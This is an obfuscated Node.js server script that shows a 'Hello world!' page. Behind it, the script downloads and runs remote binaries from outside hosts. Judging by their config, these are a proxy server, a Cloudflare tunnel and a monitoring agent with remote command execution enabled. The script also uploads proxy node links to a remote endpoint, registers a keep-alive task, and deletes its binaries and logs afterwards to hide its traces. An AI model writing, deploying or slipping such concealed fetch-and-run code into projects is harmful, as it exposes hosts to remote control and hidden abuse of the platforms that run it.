const _0x299acc=_0x2411;(function(_0x9a846,_0x4e890e){const _0x2fdbe7=_0x2411,_0x431e56=_0x9a846();while(!![]){try{const _0x251230=-parseInt(_0x2fdbe7(0x15c))/0x1*(-parseInt(_0x2fdbe7(0x1ad))/0x2)+parseInt(_0x2fdbe7(0x1a2))/0x3*(-parseInt(_0x2fdbe7(0x1a4))/0x4)+parseInt(_0x2fdbe7(0x15d))/0x5*(-parseInt(_0x2fdbe7(0x194))/0x6)+parseInt(_0x2fdbe7(0x1a3))/0x7*(-parseInt(_0x2fdbe7(0x1da))/0x8)+-parseInt(_0x2fdbe7(0x18a))/0x9*(-parseInt(_0x2fdbe7(0x1ab))/0xa)+-parseInt(_0x2fdbe7(0x1ce))/0xb+-parseInt(_0x2fdbe7(0x1f2))/0xc*(-parseInt(_0x2fdbe7(0x208))/0xd);if(_0x251230===_0x4e890e)break;else _0x431e56['push'](_0x431e56['shift']());}catch(_0x408cfe){_0x431e56['push'](_0x431e56['shift']());}}}(_0x5f58,0xb9871));const express=require(_0x299acc(0x157)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x299acc(0x15b)),{promisify}=require(_0x299acc(0x1f5)),exec=promisify(require(_0x299acc(0x1b4))[_0x299acc(0x18e)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x299acc(0x1bf)][_0x299acc(0x1d8)]||'',PROJECT_URL=process[_0x299acc(0x1bf)]['PROJECT_URL']||'',AUTO_ACCESS=process['env'][_0x299acc(0x19b)]||![],FILE_PATH=process[_0x299acc(0x1bf)][_0x299acc(0x176)]||_0x299acc(0x201),SUB_PATH=process[_0x299acc(0x1bf)][_0x299acc(0x183)]||_0x299acc(0x163),PORT=process['env'][_0x299acc(0x1dc)]||process[_0x299acc(0x1bf)][_0x299acc(0x205)]||0xbb8,UUID=process[_0x299acc(0x1bf)]['UUID']||_0x299acc(0x199),NEZHA_SERVER=process[_0x299acc(0x1bf)][_0x299acc(0x18c)]||'',NEZHA_PORT=process['env'][_0x299acc(0x185)]||'',NEZHA_KEY=process[_0x299acc(0x1bf)][_0x299acc(0x16f)]||'',ARGO_DOMAIN=process['env']['ARGO_DOMAIN']||'',ARGO_AUTH=process[_0x299acc(0x1bf)]['ARGO_AUTH']||'',ARGO_PORT=process[_0x299acc(0x1bf)]['ARGO_PORT']||0x1f41,CFIP=process[_0x299acc(0x1bf)][_0x299acc(0x18d)]||_0x299acc(0x1fa),CFPORT=process[_0x299acc(0x1bf)][_0x299acc(0x1ed)]||0x1bb,NAME=process[_0x299acc(0x1bf)]['NAME']||_0x299acc(0x1f6);!fs['existsSync'](FILE_PATH)?(fs[_0x299acc(0x17f)](FILE_PATH),console['log'](FILE_PATH+'\x20is\x20created')):console[_0x299acc(0x187)](FILE_PATH+_0x299acc(0x156));let npmPath=path[_0x299acc(0x17b)](FILE_PATH,_0x299acc(0x20e)),phpPath=path['join'](FILE_PATH,_0x299acc(0x1c7)),webPath=path[_0x299acc(0x17b)](FILE_PATH,_0x299acc(0x1eb)),botPath=path[_0x299acc(0x17b)](FILE_PATH,_0x299acc(0x1c9)),subPath=path[_0x299acc(0x17b)](FILE_PATH,_0x299acc(0x192)),listPath=path[_0x299acc(0x17b)](FILE_PATH,_0x299acc(0x16c)),bootLogPath=path[_0x299acc(0x17b)](FILE_PATH,_0x299acc(0x19a)),configPath=path[_0x299acc(0x17b)](FILE_PATH,_0x299acc(0x167));function deleteNodes(){const _0x15cfe2=_0x299acc;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x1490b5;try{_0x1490b5=fs['readFileSync'](subPath,_0x15cfe2(0x204));}catch{return null;}const _0x475cff=Buffer['from'](_0x1490b5,_0x15cfe2(0x174))[_0x15cfe2(0x1b7)]('utf-8'),_0x5c2084=_0x475cff[_0x15cfe2(0x19f)]('\x0a')[_0x15cfe2(0x168)](_0x1fee9c=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x15cfe2(0x203)](_0x1fee9c));if(_0x5c2084[_0x15cfe2(0x1cb)]===0x0)return;return axios[_0x15cfe2(0x1e2)](UPLOAD_URL+_0x15cfe2(0x164),JSON[_0x15cfe2(0x1a8)]({'nodes':_0x5c2084}),{'headers':{'Content-Type':_0x15cfe2(0x1e5)}})[_0x15cfe2(0x1e1)](_0x5eec2d=>{return null;});}catch(_0x1b1e50){return null;}}function cleanupOldFiles(){const _0x4a27a0=_0x299acc,_0x172667=['web',_0x4a27a0(0x1c9),_0x4a27a0(0x20e),'php',_0x4a27a0(0x192),'boot.log'];_0x172667[_0x4a27a0(0x202)](_0x49880d=>{const _0x53793d=_0x4a27a0,_0x4f47bf=path[_0x53793d(0x17b)](FILE_PATH,_0x49880d);fs['unlink'](_0x4f47bf,()=>{});});}app[_0x299acc(0x16d)]('/',function(_0x45f0e8,_0x448f6c){const _0x10abf8=_0x299acc;_0x448f6c[_0x10abf8(0x188)](_0x10abf8(0x1fc));});const config={'log':{'access':'/dev/null','error':_0x299acc(0x1cf),'loglevel':_0x299acc(0x153)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x299acc(0x1e3)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x299acc(0x161),'dest':0xbba},{'path':_0x299acc(0x19e),'dest':0xbbb},{'path':_0x299acc(0x1be),'dest':0xbbc}]},'streamSettings':{'network':_0x299acc(0x154)}},{'port':0xbb9,'listen':_0x299acc(0x1d4),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x299acc(0x153)},'streamSettings':{'network':'tcp','security':_0x299acc(0x153)}},{'port':0xbba,'listen':_0x299acc(0x1d4),'protocol':_0x299acc(0x1b1),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x299acc(0x153),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':![],'destOverride':[_0x299acc(0x1ef),_0x299acc(0x190),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x299acc(0x1d4),'protocol':_0x299acc(0x193),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x299acc(0x19e)}},'sniffing':{'enabled':![],'destOverride':['http',_0x299acc(0x190),_0x299acc(0x1c6)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x299acc(0x1d4),'protocol':_0x299acc(0x1fd),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x299acc(0x153),'wsSettings':{'path':_0x299acc(0x1be)}},'sniffing':{'enabled':![],'destOverride':[_0x299acc(0x1ef),_0x299acc(0x190),_0x299acc(0x1c6)],'metadataOnly':![]}}],'dns':{'servers':[_0x299acc(0x1ea)]},'outbounds':[{'protocol':_0x299acc(0x1ff),'tag':_0x299acc(0x1de)},{'protocol':_0x299acc(0x1a5),'tag':_0x299acc(0x198)}]};fs[_0x299acc(0x20d)](path['join'](FILE_PATH,'config.json'),JSON['stringify'](config,null,0x2));function getSystemArchitecture(){const _0x5ebc07=_0x299acc,_0x39125f=os[_0x5ebc07(0x16b)]();return _0x39125f===_0x5ebc07(0x206)||_0x39125f===_0x5ebc07(0x191)||_0x39125f==='aarch64'?_0x5ebc07(0x206):'amd';}function downloadFile(_0x46bcba,_0x5cc39b,_0x1de266){const _0x3850d7=_0x299acc,_0x211c45=path[_0x3850d7(0x17b)](FILE_PATH,_0x46bcba),_0x566d0d=fs[_0x3850d7(0x1ae)](_0x211c45);axios({'method':_0x3850d7(0x16d),'url':_0x5cc39b,'responseType':_0x3850d7(0x1ac)})[_0x3850d7(0x1b9)](_0x190be6=>{const _0x3569fc=_0x3850d7;_0x190be6[_0x3569fc(0x160)][_0x3569fc(0x184)](_0x566d0d),_0x566d0d['on'](_0x3569fc(0x1e8),()=>{const _0x22d0ef=_0x3569fc;_0x566d0d['close'](),console[_0x22d0ef(0x187)](_0x22d0ef(0x181)+_0x46bcba+_0x22d0ef(0x179)),_0x1de266(null,_0x46bcba);}),_0x566d0d['on']('error',_0x1bc98b=>{const _0x6fd93b=_0x3569fc;fs[_0x6fd93b(0x158)](_0x211c45,()=>{});const _0x47a57c=_0x6fd93b(0x181)+_0x46bcba+_0x6fd93b(0x152)+_0x1bc98b[_0x6fd93b(0x175)];console[_0x6fd93b(0x17e)](_0x47a57c),_0x1de266(_0x47a57c);});})['catch'](_0xaaddf0=>{const _0x4075da=_0x3850d7,_0x533253=_0x4075da(0x181)+_0x46bcba+'\x20failed:\x20'+_0xaaddf0['message'];console[_0x4075da(0x17e)](_0x533253),_0x1de266(_0x533253);});}function _0x5f58(){const _0x117eda=['26817SjbIAr','7EvuKZV','176xAFrfF','blackhole','bot\x20is\x20running','\x0aclient_secret:\x20','stringify','ARGO_DOMAIN:','/npm\x20-s\x20','10pCCrNu','stream','46SWzztM','createWriteStream','https://amd64.ssss.nyc.mn/agent','ArgoDomain:','vless','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','?security=tls&sni=','child_process','https://arm64.ssss.nyc.mn/web','Subscription\x20uploaded\x20successfully','toString','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','then','/vmess-argo?ed=2560','https://amd64.ssss.nyc.mn/web','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','2053','/trojan-argo','env','false','Content-Type','2087','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','https://amd64.ssss.nyc.mn/2go','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','quic','php','text/plain;\x20charset=utf-8','bot','existsSync','length','\x0a\x20\x20credentials-file:\x20','https://oooo.serv00.net/add-url','10909657cKzoph','/dev/null','includes','/tunnel.yml\x20run','php\x20running\x20error:\x20','listen','127.0.0.1','from','npm\x20running\x20error:\x20','Error\x20reading\x20boot.log:','UPLOAD_URL','/api/add-nodes','2766392TmRqQt','pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1','SERVER_PORT','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','direct','set','\x20>/dev/null\x202>&1','catch','post','xtls-rprx-vision','/config.json\x20>/dev/null\x202>&1\x20&','application/json','./npm','Error\x20executing\x20command:\x20','finish','has','https+local://8.8.8.8/dns-query','web','push','CFPORT','\x0a\x20\x20\x20\x20','http','443','Error\x20downloading\x20files:','17175876eRNGAn','/bot\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','util','Vls','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','\x0a\x20\x20\x0avmess://','https://arm64.ssss.nyc.mn/2go','www.visa.com.sg','Empowerment\x20failed\x20for\x20','Hello\x20world!','trojan','/sub.txt\x20saved\x20successfully','freedom','?encryption=none&security=tls&sni=','./tmp','forEach','test','utf-8','PORT','arm','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','13EVQGeF','&type=ws&host=','2096','true','&path=%2Fvless-argo%3Fed%3D2560#','writeFileSync','npm','8443','\x20failed:\x20','none','tcp','App\x20is\x20running','\x20already\x20exists','express','unlink','clear','https://arm64.ssss.nyc.mn/v1','path','56167dmKLdG','20UGRDQs','npm\x20is\x20running','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','data','/vless-argo','2083','sub','/api/delete-nodes','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','nohup\x20','config.json','filter','https://amd64.ssss.nyc.mn/v1','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','arch','list.txt','get','/web\x20-c\x20','NEZHA_KEY','--tls','添加URL失败:\x20','status','unshift','base64','message','FILE_PATH','./web','map','\x20successfully','readFileSync','join','\x0avless://','\x20>/dev/null\x202>&1\x20&','error','mkdirSync','\x0a\x20\x20\x0atrojan://','Download\x20','TunnelSecret','SUB_PATH','pipe','NEZHA_PORT','fileName','log','send','web\x20running\x20error:\x20','11318139OAIMCT','\x20-p\x20','NEZHA_SERVER','CFIP','exec','match','tls','arm64','sub.txt','vmess','2234868hDGEpc','response','Skipping\x20adding\x20automatic\x20access\x20task','php\x20is\x20running','block','5ce51bb2-e2db-4aeb-b9a1-a8b3740816d4','boot.log','AUTO_ACCESS','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','Empowerment\x20success\x20for\x20','/vmess-argo','split','./bot','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel'];_0x5f58=function(){return _0x117eda;};return _0x5f58();}async function downloadFilesAndRun(){const _0x53866a=_0x299acc,_0x5876a4=getSystemArchitecture(),_0x508850=getFilesForArchitecture(_0x5876a4);if(_0x508850['length']===0x0){console[_0x53866a(0x187)](_0x53866a(0x1f4));return;}const _0xb4e997=_0x508850[_0x53866a(0x178)](_0x52c5d4=>{return new Promise((_0x4bb9fc,_0x34db92)=>{const _0xebd3d7=_0x2411;downloadFile(_0x52c5d4[_0xebd3d7(0x186)],_0x52c5d4['fileUrl'],(_0x556857,_0x4dadea)=>{_0x556857?_0x34db92(_0x556857):_0x4bb9fc(_0x4dadea);});});});try{await Promise['all'](_0xb4e997);}catch(_0x28c5b9){console[_0x53866a(0x17e)](_0x53866a(0x1f1),_0x28c5b9);return;}function _0x3aeb8f(_0x26e6fe){const _0x18ca82=_0x53866a,_0x4cf43e=0x1fd;_0x26e6fe[_0x18ca82(0x202)](_0x588196=>{const _0x59d035=_0x18ca82,_0x57d08d=path[_0x59d035(0x17b)](FILE_PATH,_0x588196);fs[_0x59d035(0x1ca)](_0x57d08d)&&fs['chmod'](_0x57d08d,_0x4cf43e,_0x497388=>{const _0x39e6ff=_0x59d035;_0x497388?console[_0x39e6ff(0x17e)](_0x39e6ff(0x1fb)+_0x57d08d+':\x20'+_0x497388):console['log'](_0x39e6ff(0x19d)+_0x57d08d+':\x20'+_0x4cf43e[_0x39e6ff(0x1b7)](0x8));});});}const _0xf76d56=NEZHA_PORT?[_0x53866a(0x1e6),_0x53866a(0x177),'./bot']:['./php',_0x53866a(0x177),_0x53866a(0x1a0)];_0x3aeb8f(_0xf76d56);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x10418e=NEZHA_SERVER[_0x53866a(0x1d0)](':')?NEZHA_SERVER[_0x53866a(0x19f)](':')['pop']():'',_0x74918e=new Set([_0x53866a(0x1f0),_0x53866a(0x151),_0x53866a(0x20a),_0x53866a(0x1c2),_0x53866a(0x162),_0x53866a(0x1bd)]),_0x51ed8a=_0x74918e[_0x53866a(0x1e9)](_0x10418e)?_0x53866a(0x20b):_0x53866a(0x1c0),_0x3db4b5=_0x53866a(0x1a7)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20'+NEZHA_SERVER+_0x53866a(0x19c)+_0x51ed8a+_0x53866a(0x1b8)+UUID;fs[_0x53866a(0x20d)](path['join'](FILE_PATH,'config.yaml'),_0x3db4b5);const _0x1933b6=_0x53866a(0x166)+FILE_PATH+'/php\x20-c\x20\x22'+FILE_PATH+_0x53866a(0x1bc);try{await exec(_0x1933b6),console[_0x53866a(0x187)](_0x53866a(0x197)),await new Promise(_0x495a78=>setTimeout(_0x495a78,0x3e8));}catch(_0x4d10d8){console[_0x53866a(0x17e)](_0x53866a(0x1d2)+_0x4d10d8);}}else{let _0x34e497='';const _0x282e8b=[_0x53866a(0x1f0),_0x53866a(0x151),'2096',_0x53866a(0x1c2),'2083','2053'];_0x282e8b[_0x53866a(0x1d0)](NEZHA_PORT)&&(_0x34e497=_0x53866a(0x170));const _0x3d2ceb='nohup\x20'+FILE_PATH+_0x53866a(0x1aa)+NEZHA_SERVER+':'+NEZHA_PORT+_0x53866a(0x18b)+NEZHA_KEY+'\x20'+_0x34e497+_0x53866a(0x17d);try{await exec(_0x3d2ceb),console[_0x53866a(0x187)](_0x53866a(0x15e)),await new Promise(_0x1b4ba7=>setTimeout(_0x1b4ba7,0x3e8));}catch(_0x553b36){console[_0x53866a(0x17e)](_0x53866a(0x1d6)+_0x553b36);}}}else console[_0x53866a(0x187)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x5ab956='nohup\x20'+FILE_PATH+_0x53866a(0x16e)+FILE_PATH+_0x53866a(0x1e4);try{await exec(_0x5ab956),console[_0x53866a(0x187)]('web\x20is\x20running'),await new Promise(_0x5c827d=>setTimeout(_0x5c827d,0x3e8));}catch(_0x4751a9){console[_0x53866a(0x17e)](_0x53866a(0x189)+_0x4751a9);}if(fs[_0x53866a(0x1ca)](path[_0x53866a(0x17b)](FILE_PATH,'bot'))){let _0x3671a2;if(ARGO_AUTH[_0x53866a(0x18f)](/^[A-Z0-9a-z=]{120,250}$/))_0x3671a2=_0x53866a(0x1f7)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x3671a2=_0x53866a(0x15f)+FILE_PATH+_0x53866a(0x1d1):_0x3671a2=_0x53866a(0x1c3)+FILE_PATH+_0x53866a(0x1dd)+ARGO_PORT;try{await exec('nohup\x20'+FILE_PATH+_0x53866a(0x1f3)+_0x3671a2+_0x53866a(0x17d)),console['log'](_0x53866a(0x1a6)),await new Promise(_0x2a9765=>setTimeout(_0x2a9765,0x7d0));}catch(_0x3c292e){console[_0x53866a(0x17e)]('Error\x20executing\x20command:\x20'+_0x3c292e);}}await new Promise(_0x45308d=>setTimeout(_0x45308d,0x1388));}function getFilesForArchitecture(_0x4d2f54){const _0x3d83d8=_0x299acc;let _0xd9a6d9;_0x4d2f54===_0x3d83d8(0x206)?_0xd9a6d9=[{'fileName':_0x3d83d8(0x1eb),'fileUrl':_0x3d83d8(0x1b5)},{'fileName':_0x3d83d8(0x1c9),'fileUrl':_0x3d83d8(0x1f9)}]:_0xd9a6d9=[{'fileName':_0x3d83d8(0x1eb),'fileUrl':_0x3d83d8(0x1bb)},{'fileName':'bot','fileUrl':_0x3d83d8(0x1c4)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x2ceaa7=_0x4d2f54==='arm'?'https://arm64.ssss.nyc.mn/agent':_0x3d83d8(0x1af);_0xd9a6d9[_0x3d83d8(0x173)]({'fileName':'npm','fileUrl':_0x2ceaa7});}else{const _0x43c312=_0x4d2f54==='arm'?_0x3d83d8(0x15a):_0x3d83d8(0x169);_0xd9a6d9[_0x3d83d8(0x173)]({'fileName':_0x3d83d8(0x1c7),'fileUrl':_0x43c312});}}return _0xd9a6d9;}function argoType(){const _0x3494dc=_0x299acc;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x3494dc(0x165));return;}if(ARGO_AUTH[_0x3494dc(0x1d0)](_0x3494dc(0x182))){fs[_0x3494dc(0x20d)](path[_0x3494dc(0x17b)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x35aedb='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x3494dc(0x19f)]('\x22')[0xb]+_0x3494dc(0x1cc)+path[_0x3494dc(0x17b)](FILE_PATH,'tunnel.json')+_0x3494dc(0x16a)+ARGO_DOMAIN+_0x3494dc(0x207)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x3494dc(0x20d)](path['join'](FILE_PATH,'tunnel.yml'),_0x35aedb);}else console[_0x3494dc(0x187)](_0x3494dc(0x1a1));}argoType();async function extractDomains(){const _0x4103f2=_0x299acc;let _0xc747e8;if(ARGO_AUTH&&ARGO_DOMAIN)_0xc747e8=ARGO_DOMAIN,console[_0x4103f2(0x187)](_0x4103f2(0x1a9),_0xc747e8),await _0x5479e3(_0xc747e8);else try{const _0x381b4e=fs[_0x4103f2(0x17a)](path['join'](FILE_PATH,_0x4103f2(0x19a)),_0x4103f2(0x204)),_0x2e55f6=_0x381b4e[_0x4103f2(0x19f)]('\x0a'),_0x4ce2df=[];_0x2e55f6['forEach'](_0x651d11=>{const _0x47eb6a=_0x4103f2,_0x49277f=_0x651d11['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x49277f){const _0x459bba=_0x49277f[0x1];_0x4ce2df[_0x47eb6a(0x1ec)](_0x459bba);}});if(_0x4ce2df[_0x4103f2(0x1cb)]>0x0)_0xc747e8=_0x4ce2df[0x0],console[_0x4103f2(0x187)](_0x4103f2(0x1b0),_0xc747e8),await _0x5479e3(_0xc747e8);else{console[_0x4103f2(0x187)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs['unlinkSync'](path['join'](FILE_PATH,_0x4103f2(0x19a)));async function _0x429c24(){const _0x4114fd=_0x4103f2;try{await exec(_0x4114fd(0x1db));}catch(_0x5a89bf){}}_0x429c24(),await new Promise(_0x4ead95=>setTimeout(_0x4ead95,0xbb8));const _0x827c42='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x4103f2(0x166)+path[_0x4103f2(0x17b)](FILE_PATH,_0x4103f2(0x1c9))+'\x20'+_0x827c42+_0x4103f2(0x17d)),console[_0x4103f2(0x187)]('bot\x20is\x20running.'),await new Promise(_0x5a0fb8=>setTimeout(_0x5a0fb8,0xbb8)),await extractDomains();}catch(_0x1263d1){console['error'](_0x4103f2(0x1e7)+_0x1263d1);}}}catch(_0x1247ba){console[_0x4103f2(0x17e)](_0x4103f2(0x1d7),_0x1247ba);}async function _0x5479e3(_0xa7f9bd){const _0x5586e5=_0x4103f2,_0x1bfc88=execSync(_0x5586e5(0x1c5),{'encoding':_0x5586e5(0x204)}),_0x2f0cb9=_0x1bfc88['trim']();return new Promise(_0x4c7225=>{setTimeout(()=>{const _0x1d0f28=_0x2411,_0x23c393={'v':'2','ps':NAME+'-'+_0x2f0cb9,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x1d0f28(0x153),'net':'ws','type':'none','host':_0xa7f9bd,'path':_0x1d0f28(0x1ba),'tls':_0x1d0f28(0x190),'sni':_0xa7f9bd,'alpn':''},_0x5ef453=_0x1d0f28(0x17c)+UUID+'@'+CFIP+':'+CFPORT+_0x1d0f28(0x200)+_0xa7f9bd+_0x1d0f28(0x209)+_0xa7f9bd+_0x1d0f28(0x20c)+NAME+'-'+_0x2f0cb9+_0x1d0f28(0x1f8)+Buffer['from'](JSON[_0x1d0f28(0x1a8)](_0x23c393))[_0x1d0f28(0x1b7)](_0x1d0f28(0x174))+_0x1d0f28(0x180)+UUID+'@'+CFIP+':'+CFPORT+_0x1d0f28(0x1b3)+_0xa7f9bd+_0x1d0f28(0x209)+_0xa7f9bd+'&path=%2Ftrojan-argo%3Fed%3D2560#'+NAME+'-'+_0x2f0cb9+_0x1d0f28(0x1ee);console[_0x1d0f28(0x187)](Buffer[_0x1d0f28(0x1d5)](_0x5ef453)['toString']('base64')),fs[_0x1d0f28(0x20d)](subPath,Buffer['from'](_0x5ef453)['toString'](_0x1d0f28(0x174))),console[_0x1d0f28(0x187)](FILE_PATH+_0x1d0f28(0x1fe)),uplodNodes(),app[_0x1d0f28(0x16d)]('/'+SUB_PATH,(_0x4dae1c,_0x4a1a35)=>{const _0x52fba4=_0x1d0f28,_0x2ba64d=Buffer['from'](_0x5ef453)['toString'](_0x52fba4(0x174));_0x4a1a35[_0x52fba4(0x1df)](_0x52fba4(0x1c1),_0x52fba4(0x1c8)),_0x4a1a35['send'](_0x2ba64d);}),_0x4c7225(_0x5ef453);},0x7d0);});}}async function uplodNodes(){const _0x2ed1e6=_0x299acc;if(UPLOAD_URL&&PROJECT_URL){const _0x3d8da6=PROJECT_URL+'/'+SUB_PATH,_0x2fcbc0={'subscription':[_0x3d8da6]};try{const _0x145910=await axios[_0x2ed1e6(0x1e2)](UPLOAD_URL+'/api/add-subscriptions',_0x2fcbc0,{'headers':{'Content-Type':_0x2ed1e6(0x1e5)}});if(_0x145910[_0x2ed1e6(0x172)]===0xc8)console[_0x2ed1e6(0x187)](_0x2ed1e6(0x1b6));else return null;}catch(_0x77c95b){if(_0x77c95b['response']){if(_0x77c95b[_0x2ed1e6(0x195)][_0x2ed1e6(0x172)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x2ed1e6(0x1ca)](listPath))return;const _0x55f2e7=fs[_0x2ed1e6(0x17a)](listPath,_0x2ed1e6(0x204)),_0x54d097=_0x55f2e7[_0x2ed1e6(0x19f)]('\x0a')[_0x2ed1e6(0x168)](_0xde96a0=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2ed1e6(0x203)](_0xde96a0));if(_0x54d097['length']===0x0)return;const _0x8dbe1e=JSON['stringify']({'nodes':_0x54d097});try{await axios[_0x2ed1e6(0x1e2)](UPLOAD_URL+_0x2ed1e6(0x1d9),_0x8dbe1e,{'headers':{'Content-Type':_0x2ed1e6(0x1e5)}});if(response['status']===0xc8)console[_0x2ed1e6(0x187)](_0x2ed1e6(0x1b6));else return null;}catch(_0x3ff232){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x339c2d=_0x2411,_0x551202=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(NEZHA_PORT)_0x551202[_0x339c2d(0x1ec)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x551202[_0x339c2d(0x1ec)](phpPath);exec('rm\x20-rf\x20'+_0x551202[_0x339c2d(0x17b)]('\x20')+_0x339c2d(0x1e0),_0x4aa1ba=>{const _0x145a02=_0x339c2d;console[_0x145a02(0x159)](),console['log'](_0x145a02(0x155)),console[_0x145a02(0x187)](_0x145a02(0x1b2));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x4633e8=_0x299acc;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x4633e8(0x187)](_0x4633e8(0x196));return;}try{const _0x24b2fd=await axios[_0x4633e8(0x1e2)](_0x4633e8(0x1cd),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x4633e8(0x1e5)}});console[_0x4633e8(0x187)]('automatic\x20access\x20task\x20added\x20successfully');}catch(_0x452b61){console[_0x4633e8(0x17e)](_0x4633e8(0x171)+_0x452b61[_0x4633e8(0x175)]);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}function _0x2411(_0x2baa00,_0x906c30){const _0x5f583e=_0x5f58();return _0x2411=function(_0x24114d,_0x58a4a9){_0x24114d=_0x24114d-0x151;let _0x1be64f=_0x5f583e[_0x24114d];return _0x1be64f;},_0x2411(_0x2baa00,_0x906c30);}startserver(),app[_0x299acc(0x1d3)](PORT,()=>console['log']('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
